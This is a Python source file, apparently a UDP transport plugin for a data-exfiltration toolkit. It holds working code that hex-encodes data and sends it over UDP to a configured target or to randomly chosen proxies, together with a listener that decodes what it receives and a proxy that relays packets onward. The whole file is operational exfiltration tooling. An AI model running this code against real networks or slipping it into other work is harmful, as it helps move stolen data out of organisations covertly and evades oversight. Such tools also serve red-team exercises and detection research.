import socket
import sys
from random import choice

config = None
app_exfiltrate = None


def send(data):
    if config.has_key('proxies') and config['proxies'] != [""]:
        targets = [config['target']] + config['proxies']
        target = choice(targets)
    else:
        target = config['target']
    port = config['port']
    app_exfiltrate.log_message(
        'info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.sendto(data.encode('hex'), (target, port))

def listen():
    sniff(handler=app_exfiltrate.retrieve_data)

def sniff(handler):
    port = config['port']
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    try:
        server_address = ('', port)
        sock.bind(server_address)
        app_exfiltrate.log_message(
            'info', "[udp] Starting server on port {}...".format(port))
    except socket.error as e:
        app_exfiltrate.log_message(
            'warning', "[udp] Couldn't bind on port {}...".format(port))
        sys.exit(-1)

    while True:
        app_exfiltrate.log_message('info', "[udp] Waiting for connections...")
        try:
            while True:
                data, client_address = sock.recvfrom(65535)
                app_exfiltrate.log_message(
                    'info', "[udp] client connected: {}".format(client_address))
                if data:
                    app_exfiltrate.log_message(
                        'info', "[udp] Received {} bytes".format(len(data)))
                    try:
                        data = data.decode('hex')
                        #app_exfiltrate.retrieve_data(data)
                        handler(data)
                    except Exception, e:
                        app_exfiltrate.log_message(
                            'warning', "[udp] Failed decoding message {}".format(e))
                else:
                    break
        finally:
            pass

def relay_dns_packet(data):
    target = config['target']
    port = config['port']
    app_exfiltrate.log_message(
        'info', "[proxy] [udp] Relaying {0} bytes to {1}".format(len(data), target))
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.sendto(data.encode('hex'), (target, port))

def proxy():
    app_exfiltrate.log_message(
            'info', "[proxy] [udp] Listening for udp packets")
    sniff(handler=relay_dns_packet)


class Plugin:

    def __init__(self, app, conf):
        global config
        global app_exfiltrate
        config = conf
        app_exfiltrate = app
        app.register_plugin('udp', {'send': send, 'listen': listen, 'proxy': proxy})
